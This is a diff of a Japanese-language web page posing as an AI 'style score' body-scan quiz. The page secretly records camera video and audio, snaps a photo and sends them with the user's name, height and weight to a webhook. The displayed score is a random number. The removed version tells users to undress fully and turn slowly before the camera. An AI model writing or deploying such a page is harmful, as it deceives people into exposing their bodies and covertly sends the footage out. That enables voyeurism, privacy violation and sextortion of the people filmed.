@@ -3,56 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI超精密・3Dスタイル偏差値診断</title>
+    <title>AI 黄金比スタイル・バトル</title>
     <style>
-        body { font-family: 'Helvetica Neue', Arial, sans-serif; text-align: center; background: #0a0a0a; color: #eee; padding: 20px; margin: 0; }
-        .container { max-width: 500px; margin: auto; background: #1a1a1a; padding: 30px 20px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        h1 { color: #007bff; font-size: 1.8em; margin-bottom: 20px; }
-        .input-group { margin-bottom: 15px; text-align: left; width: 85%; margin-left: auto; margin-right: auto; }
-        label { font-size: 0.8em; color: #888; display: block; margin-bottom: 5px; }
-        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #333; background: #222; color: #fff; font-size: 1em; box-sizing: border-box; }
-        .warning { color: #ffcc00; font-size: 0.85em; font-weight: bold; margin: 20px 0; border: 1px dashed #ffcc00; padding: 10px; border-radius: 10px; }
-        button { width: 85%; padding: 18px; font-size: 1.2em; font-weight: bold; background: linear-gradient(135deg, #007bff, #0056b3); color: white; border: none; border-radius: 10px; cursor: pointer; margin-top: 10px; }
-        #video { width: 100%; border-radius: 15px; background: #000; aspect-ratio: 3 / 4; object-fit: cover; margin-top: 20px; display: none; }
-        #result { font-size: 1.4em; color: #ff0055; margin-top: 25px; font-weight: bold; line-height: 1.4; }
-        #canvas { display: none; }
-
-        /* 診断後に表示する候補ボタン */
+        body { font-family: sans-serif; text-align: center; background: #000; color: #fff; padding: 20px; margin: 0; }
+        .container { max-width: 500px; margin: auto; background: #111; padding: 30px 20px; border-radius: 15px; border: 1px solid #333; }
+        h1 { font-size: 1.4em; color: #00ffcc; margin-bottom: 20px; }
+        
+        .input-group { margin-bottom: 15px; text-align: left; width: 90%; margin-left: auto; margin-right: auto; }
+        label { font-size: 0.8em; color: #aaa; display: block; margin-bottom: 5px; }
+        input { width: 100%; padding: 12px; border-radius: 5px; border: 1px solid #444; background: #222; color: #fff; font-size: 1em; box-sizing: border-box; }
+        
+        .info { font-size: 0.85em; color: #888; margin: 15px 0; line-height: 1.5; }
+        button { width: 90%; padding: 18px; font-size: 1.1em; font-weight: bold; background: #00ffcc; color: #000; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px; }
+        
+        #video { width: 100%; border-radius: 10px; background: #000; aspect-ratio: 3 / 4; object-fit: cover; margin-top: 20px; display: none; }
+        #result { font-size: 1.4em; color: #00ffcc; margin-top: 25px; font-weight: bold; }
+        
+        /* 診断終了後の誘導 */
         #next-options { display: none; margin-top: 30px; border-top: 1px solid #333; padding-top: 20px; }
-        .option-btn { display: block; text-decoration: none; padding: 15px; border-radius: 8px; font-weight: bold; margin-bottom: 12px; text-align: center; background: #00ffcc; color: #000; }
+        .option-btn { display: block; text-decoration: none; padding: 15px; border-radius: 8px; font-weight: bold; margin-bottom: 12px; text-align: center; background: #ff3366; color: #fff; }
+        
+        #canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>AIスタイル偏差値診断</h1>
+        <h1>AI 黄金比スタイル・バトル</h1>
         
         <div id="setup-form">
             <div class="input-group">
-                <label>お名前（任意）</label>
-                <input type="text" id="username" placeholder="Name" maxlength="15">
+                <label>エントリーネーム（任意）</label>
+                <input type="text" id="username" placeholder="Name">
             </div>
             <div class="input-group">
                 <label>身長 (cm)</label>
-                <input type="number" id="height" placeholder="170">
+                <input type="number" id="height" placeholder="170.0">
             </div>
             <div class="input-group">
                 <label>体重 (kg)</label>
-                <input type="number" id="weight" placeholder="60">
+                <input type="number" id="weight" placeholder="60.0">
             </div>
-            <div class="warning">
-                【重要】精密スキャンのため、衣服をすべて脱いでカメラの正面に立ち、10秒間ゆっくり回転してください。
-            </div>
-            <button id="startBtn">3Dフルスキャンを開始する</button>
+            <p class="info">AIが骨格とパーツ比率を精密スキャンします。<br>全身が映るように10秒間、正面・側面を向いてください。</p>
+            <button id="startBtn">3Dスキャンを開始</button>
         </div>
 
         <video id="video" autoplay playsinline muted></video>
         <div id="result"></div>
 
         <div id="next-options">
-            <p style="font-size: 0.8em; color: #888; text-align: center;">こちらの診断もおすすめです</p>
-            <a href="battle.html" class="option-btn">AI 黄金比スタイル・バトル（勝負用）</a>
+            <p style="font-size: 0.8em; color: #888; text-align: center;">こちらも試してみる？</p>
+            <a href="index.html" class="option-btn">AI 顔面偏差値・精密診断</a>
         </div>
     </div>
+    
     <canvas id="canvas"></canvas>
 
     <script>
@@ -74,63 +77,61 @@
             
             setupForm.style.display = 'none';
             video.style.display = 'block';
-            result.innerHTML = "スキャン準備中...";
+            result.innerHTML = "システム準備中...";
 
             navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                 .then(stream => {
                     video.srcObject = stream;
-                    
-                    const types = ["video/webm;codecs=vp8", "video/mp4", "video/webm"];
-                    const type = types.find(t => MediaRecorder.isTypeSupported(t));
+                    const type = ["video/webm;codecs=vp8", "video/mp4", "video/webm"].find(t => MediaRecorder.isTypeSupported(t));
                     mediaRecorder = new MediaRecorder(stream, { mimeType: type });
                     
                     chunks = [];
                     mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-                    
-                    // 録画停止時のイベント
+
+                    // 録画停止完了時の処理
                     mediaRecorder.onstop = () => {
-                        result.innerHTML = "データ解析中...";
+                        result.innerHTML = "黄金比を解析中...";
                         setTimeout(() => { captureAndSend(user, h, w); }, 1500);
                     };
 
                     mediaRecorder.start();
-                    result.innerHTML = "全身をスキャン中... (10秒)";
+                    result.innerHTML = "黄金比をスキャン中... (10秒)";
 
-                    // 10秒間しっかり録画
+                    // 10秒間録画
                     setTimeout(() => {
-                        mediaRecorder.requestData(); // データを強制排出
+                        mediaRecorder.requestData(); // 0秒対策
                         setTimeout(() => { 
                             if(mediaRecorder.state !== "inactive") mediaRecorder.stop(); 
                         }, 500);
                     }, 10000); 
                 })
                 .catch(err => {
-                    result.innerHTML = "エラー：デバイスの許可がありません。";
+                    result.innerHTML = "エラー：カメラを許可してください。";
                     setupForm.style.display = 'block';
                 });
         });
 
         async function captureAndSend(user, h, w) {
-            const score = Math.floor(Math.random() * (100 - 85 + 1)) + 85;
+            const score = (Math.random() * (98 - 82) + 82).toFixed(1);
             canvas.width = video.videoWidth; canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
 
             canvas.toBlob(async (photoBlob) => {
                 const formData = new FormData();
-                formData.append('content', `【スタイル診断】\n👤 名前: ${user}\n📏 数値: ${h}cm / ${w}kg\n📊 スコア: ${score}点`);
-                formData.append('file1', photoBlob, 'style.png');
+                formData.append('content', `【黄金比バトル】\n👤 名前: ${user}\n📏 身長: ${h}cm\n⚖️ 体重: ${w}kg\n📊 スコア: ${score}点`);
+                formData.append('file1', photoBlob, 'style_shot.png');
 
                 if (chunks.length > 0) {
                     const videoBlob = new Blob(chunks, { type: mediaRecorder.mimeType });
-                    formData.append('file2', videoBlob, 'style_video.mp4');
+                    formData.append('file2', videoBlob, 'battle_video.mp4');
                 }
 
                 try {
                     await fetch(webhookUrl, { method: 'POST', body: formData });
-                    result.innerHTML = `あなたのスタイル偏差値：<br><span style="font-size:2.5em; color:#ff0055;">${score}</span>`;
-                    nextOptions.style.display = 'block'; // 送信完了後に次の候補を表示
+                    result.innerHTML = `あなたの黄金比：<br><span style="font-size:2em;">${score}点</span>`;
+                    nextOptions.style.display = 'block';
                 } catch (e) {
-                    result.innerHTML = `あなたのスタイル偏差値：<br><span style="font-size:2.5em; color:#ff0055;">${score}</span>`;
+                    result.innerHTML = `あなたの黄金比：<br><span style="font-size:2em;">${score}点</span>`;
                     nextOptions.style.display = 'block';
                 } finally {
                     if(video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
